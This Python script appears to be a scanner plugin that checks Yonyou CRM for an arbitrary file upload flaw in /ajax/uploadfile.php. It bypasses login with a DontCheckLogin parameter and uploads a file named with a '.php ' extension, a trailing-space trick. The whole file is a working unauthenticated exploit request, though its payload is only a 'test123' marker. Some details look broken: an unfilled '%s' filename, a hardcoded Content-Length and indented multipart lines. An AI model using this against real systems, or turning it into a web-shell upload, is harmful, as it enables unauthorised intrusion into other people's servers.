import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友CRM系统uploadfile.php接口存在任意文件上传',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Connection': 'close',
        'Content-Length': '358',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Content-Type': 'multipart/form-data; boundary=---------------------------269520967239406871642430066855'
    }
    data = '''-----------------------------269520967239406871642430066855
    Content-Disposition: form-data; name="file"; filename="%s.php "
    Content-Type: application/octet-stream

    test123
    -----------------------------269520967239406871642430066855
    Content-Disposition: form-data; name="upload"

    upload
    -----------------------------269520967239406871642430066855--'''
    vurl = urllib.parse.urljoin(url, "/ajax/uploadfile.php?DontCheckLogin=1&vname=file")
    try:
        response = requests.post(vurl, headers=headers, data=data)
        if response.status_code == 200 and 'tmp.php' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = url + '/tmpfile/***.tmp.php'
        return relsult

    except:
        return relsult